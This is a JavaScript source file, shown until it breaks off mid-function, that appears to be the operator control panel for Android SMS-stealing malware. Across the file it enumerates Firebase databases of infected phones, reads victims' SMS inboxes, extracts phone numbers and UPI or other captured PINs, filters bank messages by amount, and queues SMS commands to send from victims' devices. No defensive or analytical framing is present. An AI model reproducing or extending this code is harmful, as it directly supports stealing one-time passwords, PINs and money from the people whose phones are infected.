var SEND_SMS_URL='nya.php?rebel_send_sms=1';
var FETCH_SMS_URL='nya.php?rebel_fetch_sms=1';
var APK_EXTRACT_URL='nya.php?rebel_apk_extract=1';
var FIREBASE_API_URL='nya.php?rebel_firebase_api=1';
var SMS_TOKEN_URL='nya.php?rebel_sms_token_api=1';
var allDevs=[], selDev='', clientsRawMap={};
var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
var deviceSmsCache={}, _smsLoadSeq=0, _smsLoading=false;
var SMS_CACHE_KEY='rbl_sms_cache';
var SMS_CACHE_MAX=100;
var _smsPersistTimer=null;
var devFilterMode='all', deviceBankCache={};
var currentView='home';
var moneyFilterMode='amount';
var moneyAmountMin=0,moneyAmountMax=Infinity;
var moneyMessagesList=[],moneyMessagesLoading=false;
var _initialLoadDone=false,_loadingVisible=false;
var PAGE_VIEWS={home:'view-home',online:'view-online',onlypin:'view-onlypin',liked:'view-liked',login:'view-login',money:'view-money',device:'view-device'};
var LIKED_KEY='nya_liked_devices';
var likedDevices={};
var _procDevsTimer=null, _panelPaused=false;
var _fetchAllInFlight=false, _lastFetchAllAt=0, _lastPinEnrichAt=0;
var _moneyLoadedAt=0, MONEY_CACHE_MS=120000;
var SMS_POLL_MS=800, SMS_POLL_BG_MS=3000, SYNC_INTERVAL_MS=90000;
var SMS_RENDER_DEBOUNCE_MS=16;
var _smsRenderTimer=null, _sendInFlight=false;
var FB_LIST_KEY='nya_firebase_list';
var FB_NODE_MEMORY_KEY='nya_fb_node_memory';
var ACTIVE_FB_KEY='rbl_active_fb';
var activeFbId='';
/** APK-style fast boot — deep multi-node scan runs in background */
var FAST_LOAD_MS=2500;
var DISCOVER_CONCURRENCY=10;
var DEEP_DISCOVER_CONCURRENCY=4;
var REST_BULK_MS=5500;
var DEVICE_TOGGLE_KEY='rbl_device_toggles';
var deviceToggleState={};
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','admin_pass','passwords','webhook','tokens','auth','all_pas','sms_forward','guard','login','sms','messages','all_sms','new_sms','user_sms','sms_backup','notification','notifications','app_config','version','apk','update','banner','ads','payment','payments','otp','commands','manual_commands','outbox','smsQueue','send','sendSms','sendsms'];
/** Device list nodes — NOT user_sms/messages (those are SMS stores keyed by device id) */
var DEVICE_FETCH_NODES=[
  'clients','devices','devices_status','Verify_Device','user_list','user_data',
  'users','All_Users','All_User','AllClients','all_clients','online_devices','online_users',
  'clients_list','client_list','online_status','device_list','devices_list','device_data',
  'registered_users','active_devices','active_users','connected_devices','device_status','registeredDevices'
];
var SUMMARY_NODES=DEVICE_FETCH_NODES.slice();
var DEVICE_NODES=['devices','users','clients_list','online_devices','Verify_Device','user_list','user_data','clients'];
/** Nodes that get realtime child_added/changed listeners (multi-node device sync) */
var DEVICE_LIVE_CHILD_NODES=['clients','devices','devices_status','Verify_Device','user_list','user_data','users','All_Users','All_User','AllClients','all_clients','online_devices','online_users','clients_list','client_list','device_list','devices_list','registered_users','active_devices'];
/** Per-device SMS subpaths used by Rabel / SpinPlay / Shootii panels */
var PANEL_SMS_SUFFIXES=['all_sms','new_sms','sms','messages','sms_inbox','inbox','received_sms','sent_sms','sms_list','user_sms','msg_list'];
/** Global SMS roots keyed by device id — rebel.py uses messages/{id} */
var PANEL_SMS_GLOBAL_NODES=['messages','user_sms','sms','all_sms','new_sms','sms_inbox','inbox','received_sms','sent_sms','sms_data','device_sms','client_sms','sms_logs','msg_store','text_messages','sms_backup'];

function looksLikePhone(v){
  if(v==null||v==='')return false;
  var s=String(v).trim();
  if(!s||s==='0'||s==='null'||s==='undefined')return false;
  var digits=s.replace(/\D/g,'');
  return digits.length>=10&&digits.length<=15;
}
function normalizePhoneDigits(v){
  var d=String(v||'').replace(/\D/g,'');
  if(d.length>=10)return d.slice(-10);
  return d;
}
function parseDevicePhone(v){
  if(v==null||v==='')return'';
  var s=String(v).trim();
  if(!s)return'';
  var parts=s.split(/[,;/|]+/);
  for(var i=0;i<parts.length;i++){
    var p=parts[i].trim();
    if(looksLikePhone(p))return normalizePhoneDigits(p);
  }
  if(looksLikePhone(s))return normalizePhoneDigits(s);
  return'';
}
function isHexDeviceKey(name){
  return typeof name==='string'&&/^[0-9a-f]{8,32}$/i.test(name);
}
/** APK device profile — may also carry pending SMS command fields on same node */
function isCommandOnlyClientState(raw){
  if(!raw||typeof raw!=='object')return false;
  if(raw.modelName||raw.deviceId||raw.device_model||raw.Device_info)return false;
  if(raw.mobNo!=null&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))return false;
  if(raw.sims&&(Array.isArray(raw.sims)?raw.sims.length:Object.keys(raw.sims).length))return false;
  if(raw.sim1!=null||raw.sim2!=null||raw.sim_1!=null||raw.sim_2!=null)return false;
  if(raw.d_name||raw.phone_number)return false;
  return !!(raw.cmd||raw.sendSms||raw.messageText||raw.targetDeviceId||(raw.command&&raw.messageText)||(raw.action&&raw.messageText));
}
function extractPhoneFromSmsList(list){
  if(!list||!list.length)return'';
  var patterns=[
    /Jio\s*(?:Number|no\.?)\s*[:\s]*([6-9]\d{9})/i,
    /(?:Recharge|Plan).*?(?:Jio|Airtel|Vi)\s*(?:Number|no\.?)\s*[:\s]*([6-9]\d{9})/i,
    /(?:your|registered)\s*(?:mobile|number|phone)\s*(?:is|:)\s*([6-9]\d{9})/i,
    /\b([6-9]\d{9})\b.*(?:recharge|plan|validity|UPI|A\/C)/i
  ], i, j, body, m, seen={}, out='';
  for(i=0;i<Math.min(list.length,40);i++){
    body=String((list[i]&&list[i].body)||'');
    if(!body)continue;
    for(j=0;j<patterns.length;j++){
      m=body.match(patterns[j]);
      if(m&&m[1]&&!seen[m[1]]){
        seen[m[1]]=1;
        out=m[1];
        break;
      }
    }
    if(out)return out;
  }
  return'';
}
function enrichDevicePhoneFromSms(devId){
  if(!devId)return false;
  var raw=clientsRawMap[devId];
  if(!raw)return false;
  if(raw.mobNo&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))return false;
  var cached=deviceSmsCache[devId];
  if(!cached||!cached.list||!cached.list.length)return false;
  var phone=extractPhoneFromSmsList(cached.list);
  if(!phone)return false;
  raw.mobNo=phone;
  raw._phoneSource='sms_inbox';
  clientsRawMap[devId]=raw;
  return true;
}
function preserveProfileFieldsOnIngest(existing,data,norm){
  if(!existing||!data||!norm||!isCommandOnlyClientState(data))return norm;
  var fields=['mobNo','modelName','deviceId','device_model','brand','androidV','android','sims','sim1','sim2','sim_1','sim_2','phone','phone_number','mobile','name','joined','dateJoined','upipin','upiPin','liked','like','login','checked','money','contacts','device_info','sim_info','live_data','_phoneSource','_inferredPhone'];
  fields.forEach(function(f){
    if(existing[f]==null||existing[f]==='')return;
    if(norm[f]==null||norm[f]===''||norm[f]==='Unknown')norm[f]=existing[f];
  });
  return norm;
}
function isDeviceProfileRecord(raw){
  if(!raw||typeof raw!=='object')return false;
  if(isCommandOnlyClientState(raw))return false;
  if(raw.modelName||raw.deviceId||raw.device_model||raw.Device_info)return true;
  if(raw.d_name||raw.phone_number)return true;
  if(raw.mobNo!=null&&String(raw.mobNo).trim()&& !/^unknown$/i.test(String(raw.mobNo).trim()))return true;
  if(raw.battery!==undefined&&raw.battery!==null&&String(raw.battery)!=='')return true;
  if(raw.sims&&Array.isArray(raw.sims)&&raw.sims.length)return true;
  if(raw.live_data&&typeof raw.live_data==='object')return true;
  if(raw.device_info&&typeof raw.device_info==='object')return true;
  return false;
}
function isSmsCommandRecord(raw){
  if(!raw||typeof raw!=='object')return false;
  if(isDeviceProfileRecord(raw))return false;
  if(raw.targetDeviceId&&(raw.messageText||raw.msg||raw.sendSms||raw.command||raw.cmd))return true;
  if(raw.webhookEvent&&(raw.cmd||raw.sendSms||raw.messageText||typeof raw.webhookEvent==='object'))return true;
  if(raw.command&&raw.messageText&&(raw.phoneNumber||raw.to||raw.sendSms))return true;
  return false;
}
var DEVICE_PHONE_KEYS=['phone_number','mobNo','phone','mobile','phone_no','cell','contact_no','mobile_no','sim_number','sim1','sim2','sim_1','sim_2','primary_phone','device_phone','user_phone','whatsapp','wa_number','caller_id','msisdn'];
var PHONE_ENRICH_NODES=['user_list','user_data','devices','devices_status','Verify_Device','All_Users','All_User','online_devices','device_list','registered_users','active_devices'];
/** rto9-style Firebase: these root nodes are command queues, not device profile lists */
var COMMAND_JUNK_NODES=['users','data','sendsms','bots','Admin','admin'];
function isLikelySmsRootNode(name){
  if(!name||typeof name!=='string')return false;
  if(/^(config|settings|admin|rules|metadata|logs|test|passwords|webhook|tokens|auth|version|apk|update|banner|ads|payment|otp)$/i.test(name))return false;
  if(/^(sendsms|sendSms|smsQueue|send)$/i.test(name))return false;
  return /sms|message|inbox|msg|text|chat|mail|received|sent/i.test(name);
}
function isInboundSmsRootNode(name){
  if(!name)return false;
  if(/^(sendsms|sendSms|smsQueue|send)$/i.test(name))return false;
  return isLikelySmsRootNode(name);
}
function buildDynamicSmsPaths(d,inst){
  var id=d&&d.rawId, paths=[], roots=(inst&&inst.rootKeys)||[], smsRoots=(inst&&inst.smsRootKeys)||[];
  if(!id)return paths;
  smsRoots.forEach(function(key){if(key)paths.push(key+'/'+id);});
  roots.forEach(function(key){
    if(!key||SKIP_NODES.indexOf(key)>=0||isDeviceSummaryNode(key)||isHexDeviceKey(key))return;
    if(COMMAND_JUNK_NODES.indexOf(key)>=0)return;
    if(isLikelySmsRootNode(key)&&paths.indexOf(key+'/'+id)<0)paths.push(key+'/'+id);
  });
  return uniqPaths(paths);
}
function isRtoStyleUrl(url){
  return /rto9|rto0|rto91/i.test(url||'');
}
function isCommandOnlyRecord(s){
  if(!s||typeof s!=='object')return false;
  if(isDeviceProfileRecord(s))return false;
  return !!(s.cmd||s.targetDeviceId||(s.command&&s.messageText)||(s.webhookEvent&&s.sendSms));
}
function getDeviceDisplayPhone(s){
  if(!s)return'No Number';
  return getApkPhoneDisplay(s);
}
function isRabelPanel(inst){
  if(!inst)return false;
  var url=(inst.restUrl||'');
  if(inst.schema==='rabel')return true;
  if(inst.config&&(inst.config.preferredDeviceNode==='user_list'||inst.config.preferredDeviceNode==='user_data'))return true;
  return /rto9|rto0|rabel|raand|user_list|demon|jdhd|raki/i.test(url);
}
function isJunkSmsPath(path){
  if(!path)return true;
  var parts=String(path).split('/');
  var seg=parts[0];
  if(parts.length===2&&(seg==='clients'||seg==='users'||seg==='data'||seg==='devices'))return true;
  if(COMMAND_JUNK_NODES.indexOf(seg)>=0)return true;
  if(isHexDeviceKey(seg))return true;
  return false;
}
function getApkSmsPath(d){
  return d&&d.rawId?'messages/'+d.rawId:'';
}
/** nyapanel.apk + most rabel panels — PATCH clients + PUT webhook both */
function shouldUseApkSmsPath(inst,d){
  if(!inst)return false;
  if(inst.schema==='rabel')return true;
  if(inst.config&&String(inst.config.id||'')==='nya_hdjdjdj')return true;
  if(inst.config&&String(inst.config.name||'').indexOf('Nya Panel')>=0)return true;
  return false;
}
function getDeviceProfilePath(d,fallback){
  if(!d)return fallback||'clients';
  return d.deviceNode||fallback||'clients';
}
function getClientWritePath(d,inst){
  if(!d)return 'clients';
  var fb=inst||getFbInstance(d.fbId);
  if(shouldUseApkSmsPath(fb,d)||(fb&&fb.schema==='rabel'))return 'clients';
  var pref=fb&&fb.config&&fb.config.preferredDeviceNode;
  if(pref&&pref!=='user_list'&&pref!=='user_data')return pref;
  var node=d.deviceNode||'clients';
  if(node==='user_list'||node==='user_data')return 'clients';
  return node;
}
function isDeviceLiveChildNode(node){
  if(!node)return false;
  if(DEVICE_LIVE_CHILD_NODES.indexOf(node)>=0)return true;
  return isDeviceSummaryNode(node)&&SKIP_NODES.indexOf(node)<0;
}
function getPrioritySmsPaths(d,inst){
  var id=d&&d.rawId, paths=[];
  if(!id)return paths;
  if(shouldUseApkSmsPath(inst,d))paths.push(getApkSmsPath(d));
  if(inst&&inst.smsIndex&&inst.smsIndex[id]&&inst.smsIndex[id].roots&&inst.smsIndex[id].roots.length){
    inst.smsIndex[id].roots.forEach(function(root){if(root)paths.push(root+'/'+id);});
  }
  if(inst&&inst.smsRootKeys&&inst.smsRootKeys.length){
    inst.smsRootKeys.forEach(function(root){
      if(root&&isInboundSmsRootNode(root))paths.push(root+'/'+id);
    });
  }
  paths.unshift('messages/'+id);
  getSmsDeviceBases(d,inst).forEach(function(n){
    if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
    ['all_sms','new_sms','sms','messages','user_sms'].forEach(function(sfx){
      var p=n+'/'+id+'/'+sfx;
      if(paths.indexOf(p)<0)paths.push(p);
    });
  });
  if(isRabelPanel(inst)||paths.length){
    ['user_sms','sms_backup','all_sms','new_sms'].forEach(function(root){
      var p=root+'/'+id;
      if(paths.indexOf(p)<0)paths.push(p);
    });
  }
  return uniqPaths(paths);
}
function restJsonInstShallowNode(inst,node){
  var auths=getFbAuthCandidates(inst), i=0;
  function tryNext(){
    if(i>=auths.length)return Promise.resolve(null);
    var auth=auths[i++];
    var url=(inst.restUrl||'').replace(/\/$/,'')+'/'+String(node||'').replace(/^\//,'')+'.json?shallow=true';
    if(auth)url+='&auth='+encodeURIComponent(auth);
    return restJson(url).then(function(data){
      if(data===null||isFirebaseErr(data))return tryNext();
      return data;
    }).catch(function(){return tryNext();});
  }
  return tryNext();
}
function buildSmsIndex(inst){
  if(!inst||inst.smsIndexReady)return Promise.resolve();
  var scanRoots=['user_sms','sms_backup','messages','all_sms','new_sms','sms','sms_inbox','inbox'];
  if(inst.smsRootKeys&&inst.smsRootKeys.length){
    scanRoots=uniqPaths(inst.smsRootKeys.filter(isInboundSmsRootNode).concat(scanRoots));
  }else if(isRabelPanel(inst)){
    scanRoots=['user_sms','sms_backup','messages','all_sms','new_sms'];
  }
  inst.smsIndex=inst.smsIndex||{};
  return Promise.all(scanRoots.map(function(root){
    return restJsonInstShallowNode(inst,root).then(function(keys){
      if(!keys||typeof keys!=='object')return;
      Object.keys(keys).forEach(function(devId){
        if(!devId)return;
        if(!inst.smsIndex[devId])inst.smsIndex[devId]={roots:[]};
        if(inst.smsIndex[devId].roots.indexOf(root)<0)inst.smsIndex[devId].roots.push(root);
      });
    }).catch(function(){});
  })).then(function(){
    inst.smsIndexReady=true;
    processClientsData();
  });
}
function deviceHasSmsInIndex(d){
  if(!d)return false;
  var inst=getFbInstance(d.fbId);
  return !!(inst&&inst.smsIndex&&inst.smsIndex[d.rawId]&&inst.smsIndex[d.rawId].roots&&inst.smsIndex[d.rawId].roots.length);
}
function buildUniversalSmsPaths(d,inst){
  var priority=getPrioritySmsPaths(d,inst);
  var rest=uniqPaths(smsPrimaryPaths(d,inst).concat(smsPathsForDevice(d,inst)).concat(buildDynamicSmsPaths(d,inst)));
  rest=rest.filter(function(p){return !isJunkSmsPath(p)&&priority.indexOf(p)<0;});
  return priority.concat(rest);
}

// ---- Online status (APK: status boolean + heartbeat fallback) ----
var ONLINE_FRESH_MS=45000;
var ONLINE_STALE_MS=90000;
var ONLINE_FLAG_TRUST_MS=120000;

function extractHeartbeatMs(raw){
  if(!raw||typeof raw!=='object') return 0;
  var keys=['lastMessageTime','_lastOnlineMs','last_seen','lastSeen','last_ping','lastPing','last_ping_at','lastPingAt','updated_at','updatedAt','timestamp','timestamp_millis','heartbeat','last_heartbeat','ping_at','ping_time','seen_at'];
  var best=0,i,ms;
  for(i=0;i<keys.length;i++){ms=toTimestampMs(raw[keys[i]]);if(ms>best) best=ms;}
  if(raw.ping&&typeof raw.ping==='object'){ms=toTimestampMs(raw.ping.ts||raw.ping.time||raw.ping.at);if(ms>best) best=ms;}
  if(raw.live_data&&typeof raw.live_data==='object'){ms=extractHeartbeatMs(raw.live_data);if(ms>best) best=ms;}
  if(raw.device_info&&typeof raw.device_info==='object'){ms=extractHeartbeatMs(raw.device_info);if(ms>best) best=ms;}
  return best;
}
function toTimestampMs(v){if(v==null||v==='')return 0;if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;if(typeof v==='string'){if(!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}var t=Date.parse(v);if(!isNaN(t))return t;}return 0;}
function hasExplicitOnlineFlag(s){if(!s)return false;return s.online_status===true||s.online===true||s.status===true||s.status==='online'||s.status==='true'||s.status===1;}
function hasExplicitOfflineFlag(s){if(!s)return false;return s.online_status===false||s.status===false||s.status==='offline'||s.status==='false'||s.status===0;}
function resolveOnlineStatus(s,fbId){
  if(!s)return false;
  if(isCommandOnlyRecord(s))return false;
  var now=Date.now();
  var hb=extractHeartbeatMs(s);
  var hbAge=hb?now-hb:Infinity;
  if(hasApkModelName(s)&&s.status!==undefined&&s.status!==null&&String(s.status)!==''){
    if(parseApkBool(s.status))return true;
    if(s.status===false||String(s.status).toLowerCase()==='false'||String(s.status).toLowerCase()==='offline')return false;
  }
  var flagOn=hasExplicitOnlineFlag(s);
  var flagOff=hasExplicitOfflineFlag(s);
  if(flagOn)return true;
  if(flagOff)return hbAge<=ONLINE_FRESH_MS;
  if(hb&&hbAge<=ONLINE_STALE_MS)return true;
  return false;
}

function isDeviceSummaryNode(name){
  if(!name||typeof name!=='string')return false;
  if(SKIP_NODES.indexOf(name)>=0)return false;
  if(SUMMARY_NODES.indexOf(name)>=0||DEVICE_FETCH_NODES.indexOf(name)>=0)return true;
  if(/^Verify_/i.test(name))return true;
  if(/^(All_|all_)/.test(name))return true;
  if(/_(list|lists|data|sms|devices|status|users)$/i.test(name))return true;
  if(/^(client|device|user|online|registered|active|connected)/i.test(name))return true;
  if(/^[0-9a-f]{8,32}$/i.test(name))return false;
  return false;
}
function getDeviceNodesForInst(inst){
  var nodes=DEVICE_FETCH_NODES.slice();
  if(inst&&inst.config){
    if(inst.config.preferredDeviceNode&&nodes.indexOf(inst.config.preferredDeviceNode)<0)nodes.unshift(inst.config.preferredDeviceNode);
    if(Array.isArray(inst.config.deviceNodes)){
      inst.config.deviceNodes.forEach(function(n){
        if(n&&nodes.indexOf(n)<0)nodes.unshift(n);
      });
    }
  }
  return nodes.filter(function(n,i,a){return n&&a.indexOf(n)===i;});
}
function detectSchemaFromRoots(roots,inst){
  if(!roots||typeof roots!=='object')return (inst&&inst.schema)||'spinplay';
  if(roots.Verify_Device||roots.verify_device)return 'shootii';
  if(roots.user_list||roots.user_data||roots.All_Users||roots.All_User)return 'rabel';
  if(roots.messages||roots.clients)return 'rabel';
  if(roots.devices||roots.devices_status||roots.Verify_Device)return 'spinplay';
  var url=(inst&&inst.restUrl)||'';
  if(/rabel|raand|user_list|demon|jdhd|rto9|rto0|raki/i.test(url))return 'rabel';
  if(/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i.test(url))return 'shootii';
  return (inst&&inst.schema)||'spinplay';
}
function getSmsDeviceBases(d,inst){
  var node=(d&&d.deviceNode)||'clients';
  var bases=[node,'clients','devices','devices_status','Verify_Device','user_list','user_data','users','All_Users','All_User','online_devices','clients_list'];
  if(inst&&inst.config){
    if(inst.config.preferredDeviceNode){
      var pref=inst.config.preferredDeviceNode;
      bases=bases.filter(function(b){return b!==pref;});
      bases.unshift(pref);
    }
    if(Array.isArray(inst.config.deviceNodes)){
      inst.config.deviceNodes.slice().reverse().forEach(function(n){
        if(!n)return;
        bases=bases.filter(function(b){return b!==n;});
        bases.unshift(n);
      });
    }
  }
  if(inst&&inst.schema==='shootii'&&bases.indexOf('Verify_Device')<0)bases.unshift('Verify_Device');
  var out=[],seen={};
  bases.forEach(function(b){if(b&&!seen[b]){seen[b]=1;out.push(b);}});
  return out;
}
function uniqPaths(list){
  var out=[],seen={};
  (list||[]).forEach(function(p){
    if(!p||seen[p])return;
    seen[p]=1;out.push(p);
  });
  return out;
}
var DEFAULT_FIREBASES=typeof REBEL_DEFAULT_FIREBASES!=='undefined'?REBEL_DEFAULT_FIREBASES:[];

function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
function escAttr(s){return String(s||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
function getRawDev(id){return clientsRawMap[id]||{};}
function parseApkBool(v){
  if(v===true||v===1)return true;
  if(v===false||v===0)return false;
  if(v==null||v==='')return false;
  var s=String(v).trim().toLowerCase();
  if(s==='true'||s==='1'||s==='online'||s==='yes')return true;
  if(s==='false'||s==='0'||s==='offline'||s==='no')return false;
  return false;
}
function deviceOnlineFromRaw(s,fbId){
  if(!s)return false;
  var hb=extractHeartbeatMs(s);
  var hbAge=hb?Date.now()-hb:Infinity;
  if(isCommandOnlyClientState(s)||isCommandOnlyRecord(s)){
    return hbAge<=ONLINE_FRESH_MS;
  }
  if(isNyaApkClientRecord(s)&&s.status!==undefined&&s.status!==null&&String(s.status)!==''){
    if(!parseApkOnlineStatus(s))return false;
    if(hbAge>ONLINE_FLAG_TRUST_MS)return false;
    return true;
  }
  if(s.status!==undefined&&s.status!==null&&String(s.status)!==''){
    if(parseApkBool(s.status)){
      if(hb&&hbAge>ONLINE_FLAG_TRUST_MS)return false;
      return true;
    }
    if(s.status===false||String(s.status).toLowerCase()==='false'||String(s.status).toLowerCase()==='0'||String(s.status).toLowerCase()==='offline')return false;
  }
  return resolveOnlineStatus(s,fbId);
}
function isApkYes(v){return String(v||'').toLowerCase()==='yes';}
function hasApkModelName(raw){return !!(raw&&raw.modelName!=null&&String(raw.modelName).trim());}
/** nyapanel.apk clients/ profile — same shape as rebel.py parse_device */
function isNyaApkClientRecord(raw){
  if(!raw||typeof raw!=='object')return false;
  return !!(raw.modelName||raw.deviceId||(raw.mobNo!=null&&String(raw.mobNo).trim()&&!/^unknown$/i.test(String(raw.mobNo).trim()))||(raw.sims&&(Array.isArray(raw.sims)?raw.sims.length:Object.keys(raw.sims).length))||raw.sim1!=null||raw.sim2!=null||raw.phone||raw.phone_number||raw.mobile);
}
function apkSimNumberFromEntry(s){
  if(s==null||s==='')return'';
  if(typeof s==='string'){
    var t=String(s).trim();
    return(t&&!/^unknown$/i.test(t))?t:'';
  }
  if(typeof s!=='object')return'';
  var keys=['phoneNumber','phone_number','phone','mobNo','mobile','number','contact_no','msisdn','simNumber'];
  var i,v;
  for(i=0;i<keys.length;i++){
    v=s[keys[i]];
    if(v==null||v==='')continue;
    v=String(v).trim();
    if(v&&!/^unknown$/i.test(v))return v;
  }
  return'';
}
function parseApkSims(raw){
  var sims=raw&&raw.sims,i, s, num, unique=[], seen={};
  if(!sims){
    if(raw){
      if(raw.sim1!=null||raw.sim2!=null||raw.sim_1!=null||raw.sim_2!=null){
        [raw.sim1,raw.sim2,raw.sim_1,raw.sim_2].forEach(function(v,idx){
          num=apkSimNumberFromEntry(v);
          if(!num||seen[num])return;
          seen[num]=1;
          unique.push({slot:idx+1,phoneNumber:num});
        });
      }
    }
    return unique;
  }
  if(typeof sims==='object'&&!Array.isArray(sims))sims=Object.keys(sims).map(function(k){return sims[k];});
  if(!Array.isArray(sims))return unique;
  for(i=0;i<sims.length;i++){
    s=sims[i];
    num=apkSimNumberFromEntry(s);
    if(!num||/^unknown$/i.test(num))continue;
    if(seen[num])continue;
    seen[num]=1;
    unique.push(typeof s==='object'?Object.assign({},s,{phoneNumber:num}):{phoneNumber:num,slot:i+1});
  }
  return unique;
}
function apkPhoneFromRaw(raw){
  if(!raw)return'';
  var mob='', parsed='', sims, i;
  if(raw.mobNo!=null){
    mob=String(raw.mobNo).trim();
    if(mob&&!/^unknown$/i.test(mob)){
      parsed=parseDevicePhone(mob);
      if(parsed)return parsed;
      if(looksLikePhone(mob))return mob;
    }
  }
  parsed=parseDevicePhone(raw.phone)||parseDevicePhone(raw.phone_number)||parseDevicePhone(raw.mobile)||parseDevicePhone(raw.number)||parseDevicePhone(raw.sim1)||parseDevicePhone(raw.sim2)||parseDevicePhone(raw.sim_1)||parseDevicePhone(raw.sim_2);
  if(parsed)return parsed;
  sims=parseApkSims(raw);
  for(i=0;i<sims.length;i++){
    if(sims[i].phoneNumber)return String(sims[i].phoneNumber).trim();
  }
  return'';
}
function getApkPhoneDisplay(raw,d){
  var sims=parseApkSims(raw), nums=[], i, n, fallback;
  for(i=0;i<sims.length;i++){
    n=String(sims[i].phoneNumber||'').trim();
    if(n&&!/^unknown$/i.test(n))nums.push(n);
  }
  if(nums.length)return nums.join(' | ');
  fallback=apkPhoneFromRaw(raw);
  if(fallback)return fallback;
  fallback=parseDevicePhone(raw.phone)||parseDevicePhone(raw.phone_number)||parseDevicePhone(raw.mobile);
  if(fallback)return fallback;
  if(d&&d.displayPhone&&d.displayPhone!=='No Number')return d.displayPhone;
  return'No Number';
}
function getPhoneFromRecordGeneric(s){
  if(!s||typeof s!=='object')return'';
  if(isCommandQueueRecord(s)||isSmsCommandRecord(s))return'';
  var direct=parseDevicePhone(s.mobNo)||parseDevicePhone(s.phone_number)||parseDevicePhone(s.phone)||parseDevicePhone(s.mobile);
  if(direct)return direct;
  var check=function(obj){
    if(!obj||isSmsCommandRecord(obj))return null;
    var i,v,parsed;
    for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
      if(obj[DEVICE_PHONE_KEYS[i]]==null||obj[DEVICE_PHONE_KEYS[i]]==='')continue;
      parsed=parseDevicePhone(obj[DEVICE_PHONE_KEYS[i]]);
      if(parsed)return parsed;
    }
    return null;
  };
  var skipDeepKeys={action:1,sendSms:1,sms:1,webhookEvent:1,command:1,cmd:1,manual_commands:1,outbox:1,sendsms:1};
  var deepScanPhone=function(obj,depth){
    if(!obj||typeof obj!=='object'||depth>6||isSmsCommandRecord(obj))return'';
    var k,v,p,parsed,i;
    for(k in obj){
      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
      if(skipDeepKeys[k])continue;
      v=obj[k];
      if(v==null)continue;
      if(typeof v!=='object'){
        for(i=0;i<DEVICE_PHONE_KEYS.length;i++){
          if(k===DEVICE_PHONE_KEYS[i]||(k==='number'&&depth>0)){
            parsed=parseDevicePhone(v);
            if(parsed)return parsed;
          }
        }
        continue;
      }
      if(v&&typeof v==='object'&&!skipDeepKeys[k]){
        p=deepScanPhone(v,depth+1);
        if(p)return p;
      }
    }
    return'';
  };
  var p=check(s);if(p)return p;
  var nests=['device_info','live_data','deviceInfo','liveData','info','profile','sim_info','simInfo','sim_data','SimInfo'];
  for(var n=0;n<nests.length;n++){if(s[nests[n]]){p=check(s[nests[n]]);if(p)return p;}}
  if(s.Device_info&&typeof s.Device_info==='string'){
    var m=s.Device_info.match(/(?:phone|mobile|number|sim)[^\n:]*[:]\s*([+\d\s-]{8,15})/i);
    if(m&&m[1]&&looksLikePhone(m[1]))return normalizePhoneDigits(m[1]);
  }
  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];if(!sim||typeof sim!=='object')continue;var pn=sim.phone_number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no||sim.number||sim.phoneNumber;if(pn&&looksLikePhone(pn))return normalizePhoneDigits(pn);}}
  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var j=0;j<si.sims.length;j++){var sim2=si.sims[j];var pn2=sim2.phone_number||sim2.phone||sim2.mobNo||sim2.mobile||sim2.contact_no||sim2.number||sim2.phoneNumber;if(pn2&&looksLikePhone(pn2))return normalizePhoneDigits(pn2);}}}
  return deepScanPhone(s,0);
}
function parseApkOnlineStatus(raw){
  if(!raw)return false;
  var statusVal=raw.status;
  if(statusVal===undefined||statusVal===null)return false;
  if(typeof statusVal==='string')return ['true','1','online','active'].indexOf(statusVal.trim().toLowerCase())>=0;
  if(typeof statusVal==='number')return statusVal===1;
  return !!statusVal;
}
function getApkUpiPin(raw,d){
  if(!raw&&d&&d.pin)return String(d.pin).trim();
  if(raw){
    var v=raw.upipin!=null?raw.upipin:(raw.upiPin!=null?raw.upiPin:'');
    if(v!=null&&String(v).trim()&&!/^unknown$/i.test(String(v).trim())&&String(v).trim()!=='0')return String(v).trim();
  }
  if(d&&d.pin)return String(d.pin).trim();
  return '';
}
function isPinFieldKey(key){
  if(!key||typeof key!=='string')return false;
  var k=key.toLowerCase();
  if(k==='ping'||k==='typing'||k==='spin'||k==='opinion'||k==='spinner')return false;
  return /^(upipin|upi_pin|upipincode|device_pin|devicepin|screen_pin|screenpin|lock_pin|lockpin|pin_code|pincode|atm_pin|atmpin|captured_pin|capturedpin|upi_mpin|upimpin|mpin|pin)$/.test(k);
}
function formatApkDateFromMs(ms){
  if(!ms)return '';
  var dt=new Date(ms);
  if(isNaN(dt.getTime()))return '';
  var dd=String(dt.getDate()).padStart(2,'0'),mm=String(dt.getMonth()+1).padStart(2,'0'),yyyy=dt.getFullYear();
  var h=dt.getHours(),mi=String(dt.getMinutes()).padStart(2,'0'),ap=h>=12?'PM':'AM';
  h=h%12||12;
  return dd+'/'+mm+'/'+yyyy+' | '+h+':'+mi+' '+ap;
}
function getApkJoined(raw){
  if(!raw||raw.joined==null||raw.joined==='')return '';
  return String(raw.joined).trim();
}
function getApkMobNo(raw,d){
  var mob=apkPhoneFromRaw(raw);
  if(mob)return mob;
  if(isNyaApkClientRecord(raw))return (d&&d.displayPhone)||'No Number';
  var parsed=getPhoneFromRecord(raw);
  if(parsed)return parsed;
  return (d&&d.displayPhone)||'No Number';
}
function getApkSimPhone(raw,simSlot){
  var sims=parseApkSims(raw), idx=Math.max(0,(simSlot||1)-1);
  if(sims[idx]&&sims[idx].phoneNumber)return String(sims[idx].phoneNumber).trim();
  return apkPhoneFromRaw(raw);
}
function getDeviceSmsPhone(d,simSlot){
  if(!d)return'';
  var raw=getRawDev(d.id);
